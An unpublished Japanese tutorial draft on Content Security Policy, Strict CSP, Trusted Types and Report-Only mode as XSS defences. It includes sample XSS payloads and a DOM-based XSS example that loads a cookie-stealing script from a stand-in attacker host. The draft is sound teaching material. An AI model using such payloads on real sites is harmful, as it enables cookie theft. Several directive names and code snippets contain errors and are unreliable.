---
title: "CSPのざっくり概要"
emoji: "🦔"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: [security, xss]
published: false
---

## CSP とは

- ブラウザに対して、どのような外部リソースがウェブページで許可されるかを指示するための仕組み
- **ブラウザ標準の機能**
- CSP を用いることで、ブラウザが読み込み可能なリソース（JavaScript, CSS, Img など）をホワイトリストで制限することができる
- これにより、悪意あるリソースの読み込みを防ぐことができる

CSP を設定するためには以下の 2 通りがある。

- Web サーバのレスポンスヘッダーに `Content-Security-Policy` を含ませる
- HTML の `<meta>` タグを使用して指定する

恐らく Web サーバのレスポンスヘッダーに含めてポリシーを定義するのがメジャー？

## Web サーバのレスポンスヘッダーに `Content-Security-Policy` を設定

以下のように設定する。

```
Content-Security-Policy: {policy}
```

- `policy` の箇所には、制限するリソースの種類（ディレクティブ）と、読み込み元（ソース）のペアを指定する
- ディレクティブは、特定の種類のリソースに対するポリシーを定義する
- 例えば、
  - `script-src` : どのスクリプトが実行されるかを制御する
  - `img-src` : どの画像が表示されるかを制御する
  - `style-src` : どのスタイルシートが適用されるかを制御する
- XSS に対する設定を明示的に行う場合、基本的にはスクリプトに対する制限をかけたいので、`script-scr` を定義する

### 適用例

```http
Content-Security-Policy: script-src 'self';
```

上記の場合、同じオリジンから読み込まれたスクリプトのみを許可する
:::details オリジンが異なるスクリプトの読み込みはブロックされる

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>csp test</title>
  </head>
  <body>
    <!-- `127.0.0.1:8888`は同一オリジンではないため、ブロックされる -->
    <script src="http://127.0.0.1:8888/csp.js"></script>
  </body>
</html>
```

:::

:::details インラインスクリプトはブロックされる

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>csp test</title>
  </head>
  <body>
    <script>
      alert(1); // インラインスクリプトなので実行されない
    </script>
  </body>
</html>
```

:::

:::details インラインのイベントハンドラはブロックされる

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>csp test</title>
  </head>
  <body>
    <!-- `onerror`は実行されない -->
    <img src="invalid-value" onerror="alert('XSS攻撃')" />
  </body>
</html>
```

:::

:::details javascript スキームによるスクリプトの実行はブロックされる

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>csp test</title>
  </head>
  <body>
    <!-- alert('XSS攻撃')は実行されない -->
    <a href="javascript:alert('XSS攻撃')">Click Me!!</a>
  </body>
</html>
```

:::

以下のように、`;` で区切ることで複数のディレクティブを指定できる。

```http
Content-Security-Policy: defaultsrc 'self'; scriptsrc 'self' *.trusted.com
```

## HTML の `<meta>` タグを使用して指定する

- `<head>` セクションに `<meta>` タグを使用して、CSP を設定する
- `<meta>` タグを使った方法は、サーバーの設定にアクセスできない場合や、特定のページにのみポリシーを適用したい場合に便利

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'" />
```

## 代表的なディレクティブ

CSP には以下のように様々なコンテンツを制御するためのディレクティブが用意されている。

| ディレクティブ名          | 意味                                                                                       |
| ------------------------- | ------------------------------------------------------------------------------------------ |
| script-src                | JavaScript などのスクリプトの実行を許可する                                                |
| style-src                 | CSS などのスタイルの適用を許可する                                                         |
| img-src                   | 画像の読み込み先を許可する                                                                 |
| media-src                 | 音声や動画の読み込み先を許可する                                                           |
| connect-src               | XHR や fetch 関数などのネットワークアクセスを許可する                                      |
| default-src               | 指定されていないディレクティブを一括で許可する                                             |
| frame-ancestors           | iframe などで現在ページの埋め込みを許可する                                                |
| upgrade-insecure-requests | http:// から始まる URL のリーソース取得を https:// から始まる URL に変換してリクエストする |
| sandbox                   | コンテンツをサンドボックス化して隔離させることで外部からのアクセスなどを制御する           |

この中でも `default-src` は特別な意味を持つ。
`default-src` は明示的に指定されていない他のディレクティブの制御について指定するディレクティブ。
以下の場合、全ての種類のコンテンツ読み込み先は `trusted.com` 及びそのサブドメインに限定される。

```http
Content-Security-Policy: default-src *.trusted.com
```

## ソースのキーワード

`self` のように、ソースに指定できる特別な意味を持つキーワードは以下の通り。

| style-src     | Text                                                                                                                                                                                                            |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| self          | CSP で保護するページと同一オリジンのみ許可する                                                                                                                                                                  |
| none          | あらゆるオリジンも許可しない                                                                                                                                                                                    |
| unsafe-inline | `script-src` や `style-src` ディレクティブにて、インラインスクリプトやインラインスタイルの使用を許可する                                                                                                        |
| unsafe-eval   | `script-src` ディレクティブにて、`eval` 関数の使用を許可する                                                                                                                                                    |
| unsafe-hashes | `script-src` ディレクティブにて、DOM に設定された `onclick` や `onfocus` などの実行は許可するが、`<script>` 要素を使用したインラインスクリプトや `javascript:` スキームを使用した JavaScript の実行を許可しない |

- 明示的に `unsafe-inline` が指定されていないページでは、HTML の `<script>` 要素内のインラインスクリプトやインラインのイベントハンドラ、`<style>` 要素や `style` 属性を使用したスタイルは実行されない

```html
<head>
  <style>
    /* このスタイルは適用されない */
    body {
      background-color: gray;
    }
  </style>
  <body>
    <input id="num" type="number" value="0" />
    <div id="result"></div>
  </body>

  <script>
    // このインラインスクリプトは実行されない
    console.log("inline script");
  </script>
</head>
```

- `unsafe-inline` や `unsafe-hashes` のキーワードを使用すれば、それらのインラインスクリプトやインラインスタイルの実行を許可できる
- しかし、`unsafe-xxx` のソースは安全ではないため、XSS を発生させる恐れがある
- `unsafe` という接頭辞がついている理由は、ブラウザはサーバ内で埋め込まれたインラインクリプトやインラインスタイルが、正規に埋め込まれたものなのか、XSS によって埋め込まれたものなのか判断できないから
- よって、**`unsafe-xxx` のソースの使用は非推奨**

また、以下のように一つのディレクティブに対して複数のソースを指定できる。

```http
Content-Security-Policy: script-src 'self' 'unsafe-inline' *.trusted.com
```

上記のようなソースを組み合わせながら、最初は `unsafe-inline` などを使用して緩いポリシーから運用をはじめ、徐々に厳しいポリシーへ移行していくことも可能。

## Strict CSP

- CSP を適用してインラインスクリプトを許可する方法として、`unsafe-inline` ソースを指定するものがあった
- しかし、`unsafe-inline` は非推奨
- 安全にインラインスクリプトやインラインスタイルを許可するためには、**nonce-source** や **hash-source** と呼ばれるソースを利用する

### none-source

- none-source は、`<script>` 要素に指定したランダムなトークンが CSP ヘッダのソースに指定されているトークンと一致しなければエラーにする機能
- 指定するトークンは固定値ではなく、リクエストごとにトークンを変更して、攻撃者が推測できないようにする必要がある
- none-source は以下のように指定する

```http
Content-Security-Policy: script-src 'nonce-tXCHNF14TxHbBvCj3G0WmQ=='
```

- `tXCHNF14TxHbBvCj3G0WmQ==` の部分がトークン
- ソースに指定したトークンを、以下のように `<script>` 要素の `nonce` 属性に指定する

```html
<script nonce="tXCHNF14TxHbBvCj3G0WmQ==">
  alert("このscriptは許可されているので実行される");
</script>

<script>
  alert("このscriptは許可されていないため実行されない");
</script>
```

- `nonce-source` を利用した場合は以下のように JavaScript ファイルの実行も制限することができる

```html
<!-- nonceが付与されているため実行されるJavaScriptファイル -->
<script src="./allowed.js" nonce="tXCHNF14TxHbBvCj3G0WmQ=="></script>
<script src="https://crossorigin.example/allowed.js" nonce="tXCHNF14TxHbBvCj3G0WmQ=="></script>

<!-- nonceが付与されていないため実行されないJavaScriptファイル -->
<script src=./notallowed.js></script>
```

- `nonce` 属性の値が正しければ、クロスオリジンの JavaScript ファイルの実行も許可される
- 実際の開発では、複数オリジンを指定しなければならない場合など、指定するオリジンの管理が難しいことがある

- また、nonce-source が有効なページでは、`onclick` 属性などで指定されたイベントハンドラの実行が禁止される

```html
<button id="btn" onclick="alert('クリックされました')">ClickMe!</button>
```

### hash-source

- nonce-source と同じように、トークンを指定してインラインスクリプトの実行を許可する
- トークンには、**JavaScript や CSS のコードのハッシュ値**を利用する
- HTML、CSS、JavaScript のみで構成されるサーバを持たない静的サイトの場合、リクエストごとに nonce-source のトークン値を生成することはできないが、hash-source であれば可能

例えば、以下のようなインラインスクリプトがある。

```html
<script>
  alert(1);
</script>
```

この `alert(1)` を SHA256 で計算し、Base64 でエンコードすると以下の値になる。

```
5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA=
```

この値を CSP ヘッダに設定する。

```http
Content-Security-Policy: script-src 'sha256-5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA='
```

- `<ハッシュアルゴリズム>-<Base64のハッシュ値>` の形で指定する
- SHA256 以外にも、SHA384 や SHA512 を指定できる
- インラインスクリプトの内容が 1 文字でも異なれば、ハッシュ値は全く違う値になる
- よって、仮にスクリプトが改ざんされた場合は、改ざんされたスクリプトのハッシュ値と CSP ヘッダに指定したハッシュ値は一致しない
- ハッシュ値が一致しなければそのスクリプトは実行されないため、hash-source のトークンは常に同じ値でも問題ない
- **HTML を動的に変更できない場合は、hash-source を利用する**

### strict-dynamic

nonce-source や hash-source により許可された JavaScript コード内でも、以下のような動的な `<script>` 要素の生成は禁止されている。

```html
<script nonce="tXCHNF14TxHbBvCj3G0WmQ==">
  const s = document.createElement("script");
  s.src = "https://cross-origin.example/main.js";
  document.body.appendChild(s);
</script>
```

`<script>` 要素を動的に生成したいときは、**`script-dynamic`** ソースを使用する。

```http
Content-Security-Policy: script-src 'nonce-tXCHNF14TxHbBvCj3G0WmQ==' 'strict-dynamic'
```

しかし、`strict-dynamic` を指定しても DOM-based XSS のシンクである `innerHTML` や `document.write` は機能しないように制限されている。

```html
<script nonce="tXCHNF14TxHbBvCj3G0WmQ==">
  const s = '<script src="https://cross-origin.example/main.js"></script>';
  // `innerHTML` は禁止されているため、`script` 要素はHTMLへ挿入されない
  document.querySelector("#inserted-script").innerHTML = s;
</script>
```

### object-src/base-uri

- `object-src` は Flash などのプラグインに対する制限をするディテクティブ
- `object-src: none` とすることで、Flash などのプラグインんを悪用した攻撃を防ぐ

- `base-uri` は `<base>` 要素に対する制限を行うディレクティブ
- `<base>` 要素はリンクやリソースの URL の基準となる URL を設定する HTML 要素

```html
<!-- 基準となるURLをsite.exampleに設定 -->
<base href="https://site.example/" />

<!-- リンク先はhttps://site.example/home -->
<a href="/home">Home</a>
```

- 攻撃者にって `<base>` を挿入されてしまった場合、相対パスで指定している URL を攻撃者が用意した罠サイトへの URL に変えられてしまう可能性がある
- そのため、`base-uri 'none'` を指定して `<base>` の使用を防ぐ

注意点として、**`<meta>` タグを使用して CSP を指定する場合、全てのディレクティブが使用できるわけではない**。
`frame-ancestors` や `report-uri` ディレクティブは使用できない。

## Trusted Types

Strict CSP は強力な XSS 対策であるが、開発者の実装次第で DOM-based XSS が発生する恐れがある。

```html
<script nonce="tXCHNF14TxHbBvCj3G0WmQ==">
  const s = document.createElement("script");
  s.src = location.hash.slice(1);
  document.body.appendChild(s);
</script>
```

上記コードにおいて、`https://site.example#https://attacker.example/cookie-steal.js` のような URL へ誘導された場合、以下のような HTML が生成され、攻撃者が用意した `cookie-steal.js` というスクリプトが実行されてしまう。

```html
<script src="https://attacker.example/cookie-steal.js"></script>
```

- DOM-based XSS は文字列をそのまま HTML へ反映してしまうことが原因で発生する
- 今回だと、`location.hash.slice(1)` で取得した文字列をそのまま使用していることが原因

Trusted Types という機能を使用することで、 DOM のプロパティなどが**任意の文字列を受け取ることを禁止**し、特定の関数を通過した**検証済みの文字列のみを許容**させることができる。

### Trusted Types の有効化

CSP ヘッダに `require-trusted-types-for 'script'` を指定する。

```http
Content-Security-Policy: require-trusted-types-for 'script';
```

すると、以下のような `<script>` 要素の生成も Trusted Types が有効なページでは、`location.hash.slice(1)` で取得した文字列をそのまま `src` 属性に代入することができず、エラーになる。

```html
<script>
  const s = document.createElement("script");
  // 次の行でエラーになる
  s.src = location.hash.slice(1);
  document.body.appendChild(s);
</script>
```

### ポリシー関数の定義

- Trusted Types は「**ポリシー**」と呼ばれる関数によって検査された安全な型（文字列）のみを HTML へ挿入できるように制限する
- Trusted Types は文字列を **`TrustedHTML`**、 **`TrustedScript`**、**`TrustedScriptURL`** の 3 つの型（文字列）に変換する
- 先ほど例に挙げた Trusted Types が有効なページでは、`<script>` 要素の `src` 属性には `TrustedScriptURL` 型の値しか代入できない
- よって、ポリシー関数を定義し、文字列を安全な型に変換する必要がある
- ポリシー関数の作成には、`window.trustedTypes.createPolicy()` を使用する

```html
<script>
  // Trusted Typesをサポートしているブラウザのみ一連の処理を行う
  if (window.trustedTypes && trustedTypes.createPolicy) {
    // `createPolicy()`の引数に`(ポリシー名, ポリシー関数を持つオブジェクト)`を指定
    const myPolicy = trustedTypes.createPolicy("my-policy", {
      createScriptURL: (unsafeString) => {
        const url = new URL(unsafeString, location.origin);

        //　現在のページと`<script>`要素へ指定するURLのオリジンが一致するかチェック
        if (location.origin !== url.origin) {
          // 同一オリジンでない場合はエラー
          throw new Error("同一オリジン以外のscriptは読み込めません。");
        }
        // returnされたURLオブジェクトは安全とみなされる
        return url;
      },
    });

    const s = document.createElement("script");
    // ポリシー関数を呼び出し、TrustedScriptURL型の結果を代入する
    s.src = myPolicy.createScriptURL(location.hash.slice(1));
    document.body.appendChild(s);
  }
</script>
```

- `trustedTypes.createPolicy()` の第一引数に指定するポリシー名は任意のもので構わない
- 第二引数には、文字列を検査するための関数を定義したオブジェクトを設定する
- オブジェクトには以下の関数を定義することができる

| ポリシー関数      | 役割                                                              |
| ----------------- | ----------------------------------------------------------------- |
| `createHTML`      | HTML 文字列を検査して `TrustedHTML` へ変換                        |
| `createScript`    | スクリプトの文字列を検査して `TrustedScript` へ変換               |
| `createScriptURL` | スクリプトの読み込み先の URL を検査して `TrustedScriptURL` へ変換 |

- これらのメソッドを通した値は Trusted（信頼できる）な型になる
- それぞれのメソッドを通すことで、信頼できる HTML（`TrustedHTML`）や、信頼できる URL（`TrustedScriptURL`）を得ることができる

次に、CSP ヘッダの `trusted-types` ディレクティブにポリシー名を指定する。

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types my-policy
```

指定したポリシー名以外のポリシー関数が存在した場合、エラーになる。

また、ポリシー関数の中では [DOMPurify](https://github.com/cure53/DOMPurify) などのライブラリを使用することも可能。

```js
const myPolicy = trustedTypes.createPolicy("my-policy", {
  createHTML: (unsafeHTML) => DOMPurify.sanitize(unsafeHTML),
});

const untrustedHTML = decodeURIComponent(location.hash.slice(1));
// HTML文字列を検査して`TrustedHTML`へ変換
const trustedHTML = myPolicy.createHTML(untrustedHTML);
// `TrustedHTML`は`innerHTML`などで挿入可能
el.innerHTML = trustedHTML;
```

ポリシーは以下のように複数定義することも可能。

```js
// エスケープ処理を行うポリシー
const escapePolicy = trustedTypes.createPolicy("escape", {
  createHTML: (unsafeHTML) =>
    unsafe.HTML.replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/gm "&#x27;")
});

// サニタイズを行うポリシー
const sanitizePolicy = trustedTypes.createPolicy("sanitize", {
  createHTML: (nusafeHTML) => DOMPurify.sanitize(unsafeHTML)
});
```

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types escape sanitize
```

### デフォルトポリシー

- `trustedType.createPolicy()` の第一引数に `default` を指定すると、Trusted Types のデフォルトポリシーを定義できる
- デフォルトポリシは Trusted ではない普通の文字列が代入された時に、自動的に適用する処理を記述する
- Trusted Types でない文字列が代入された際に、自動的に検査してくれる

```js
trustedTypes.createPolicy("default", {
  createHTML: (unsafeHTML) => DOMPufify.sanitize(unsafeHTML),
});

// デフォルトポリシーによって自動的に`TrustedHTML`へ変換されて代入される
el.innerHTML = decodeURIComponent(location.hash.slice(1));
```

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default
```

- ポリシー関数の作成や既存コードの修正をしなくてもデフォルトポリシーを追加するだけで、Trusted Types を適用できる
- しかし、代入する文字列全てに適用されるため、Trusted Types の影響でシステムの動作が壊れてしまっても気づきにくい

:::message

- Trusted Type は DOM-based XSS を根絶するための強力な機能
- しかし、実装漏れがあるとシステムの動作を壊しかねない

:::

### 全てのポリシーを許可する

- 通常、`trusted-types` ディレクティブに指定していないポリシーが存在する場合はエラーになる
- しかし、CSP ヘッダに `trusted-types` を指定しなければ、全てのポリシーを許可できる

```http
Content-Security-Policy: require-trusted-types-for 'script'
```

- ただし、XSS により`<meta>` 要素で勝手にポリシーを作成される危険性がある
- よって、できるだけ `trusted-types` を指定した方が良い

## `<meta>` タグとレスポンスヘッダーのどちらで CSP 設定すべきか？

- 基本的には Web サーバのレスポンスヘッダーで設定すれば良いと思う
- `<meta>` タグでの設定は色々と制限があるため、サクッと設定したい場合のみ使用する感じで良さそう

## CSP を導入前にテストする

- CSP は性質上、ホワイトリスト形式
- よって、少し設定を間違えると、サイトが機能しなくなる恐れがある
- 元々適用していなかったサイトに CSP を適用させるのは難易度が高い
- そのため、適用前に**ブロックしないテスト専用の CSP**がある
- `Content-Security-Policy-Report-Only` ヘッダーは CSP の一種
- ポリシー違反があった場合に、実際にブロックはせず、違反を報告してくれる
- 報告レポートは JSON 形式で送信される
- 既存サイトの CSP を設定・更新する際に、ポリシーの影響をモニタリングし、調整するために使える
- **`Content-Security-Policy-Report-Only` ヘッダは `<meta>` タグによる設定ができない**

![](https://storage.googleapis.com/zenn-user-upload/1d7428473706-20240317.png)

### 基本的な概念

- **レポートモード**:
  `Content-Security-Policy-Report-Only` ヘッダーを使用すると、ブラウザは設定されたポリシーに違反する行為をブロックせず、代わりに指定されたレポート URI に違反レポートを送信する。

- **デバッグ目的**:
  このモードは、新しいポリシーを導入する際のデバッグやテストに非常に役立つ。違反が発生してもユーザー体験に影響を与えることなく、ポリシーがどのように機能するかを理解しやすくなる。

- **段階的な導入**:
  CSP を初めて導入する場合や、既存のポリシーを大幅に変更する場合、`Report-Only` モードを使用して、予期しない問題が発生しないかを確認しながら段階的に導入することができる。

### 使用方法

- HTTP レスポンスヘッダーとして設定する

  ```http
  Content-Security-Policy-Report-Only: [ポリシーディレクティブ]; report-uri [レポートURI];
  ```

- 例えば、以下のように設定することができる：

  ```http
  Content-Security-Policy-Report-Only: script-src 'nonce-1LLE/F9R1nlVvTsUBIpzkA==' 'strict-dynamic' report-uri /csp-report
  ```

  - この設定では、自ドメイン (`'self'`) からのリソースのみを許可し、ポリシー違反が発生した場合は `/csp-report` にレポートを送信する
  - `report-uri`はレポート送信先リクエストのエンドポイント
  - 相対パス・絶対パスのどちらでも指定可能
  - CSP 違反があった場合、指定したエンドポイントに対して POST リクエストする
  - リクエストボディにはレポート内容を表す JSON データが付与される
  - 開発者はレポートを受け取るための POST API を用意しておく必要がある

- CSP 違反となった場合、以下のような JSON 形式のレポートが POST メソッドで指定の URL へ送信される

  ```json
  {
    "cspreport": {
      "documenturi": "https://site.example/csp",
      "referrer": "",
      "violated-directive": "script-src-elem",
      "effective-directive": "script-src-elem",
      "original-policy": "script-src'nonce-random'report-uri/csp-report",
      "disposition": "enforce",
      "blockeduri": "inline",
      "line-number": 12,
      "source-file": "https://site.example/csp",
      "status-code": 200,
      "script-sample": ""
    }
  }
  ```

  - 上記は `nonce` を指定していない `<script>` 要素があった場合のレポート
  - `violated-directive` は CSP 違反の原因となるディレクティブを指す

- 実際に活用する際は、サーバへ送信された JSON データを DB などに保存しておき、Readash などを使用して開発者がレポート内容を検索しやすくしておく
- その際、User-Agent などヘッダの情報も保存しておくと、ユーザが使用したブラウザの情報などを確認でき、エラーの調査に役立つ

- また、`Content-Security-Policy` ヘッダで 実際の CSP を適用しながらレポートのを送信することもできる
- レポートの送信には `report-uri` ディレクティブを使用する

```http
Content-Security: script-src 'nonce-1LLE/F9R1nlVvTsUBIpzkA==' 'strict-dynamic' report-uri /csp-report
```

### report-uri は現在非推奨

- report-uri は現在非推奨となっている
- 代替のディレクティブとして、`report-to` が存在する
- しかし、`report-to` は非対応のブラウザも存在する
- そのため、現在のブラウザとの互換性を保ちつつ、ブラウザが `report-to` に対応したときに前方互換性を持たせられるよう、`report-uri` と `report-to` の両方を指定できるようになっている

  ```http
  Content-Security-Policy: …; report-uri https://endpoint.com; report-to groupname
  ```

- `report-to` に対応しているブラウザでは、`report-uri` は無視される

## CSP のデメリット

- CSP はブラウザが読み込み可能なリソースをホワイトリストで制限するもの
- それが故に、メンテナンスが大変
- 読み込みを許可するリソースのリストアップが大変
- 少し設定を間違えると、サイトが機能しなくなる恐れがある

## まとめ

- CSP は XSS 対策として強力
- しかし、既存システムの本来の動作を意図せず破壊してしまう可能性がある
- Report-Only モードで事前に監視し、CSP 導入後もレポートを送信して監視し続けることが大切

## 参考文献

https://www.shoeisha.co.jp/book/detail/9784798169477
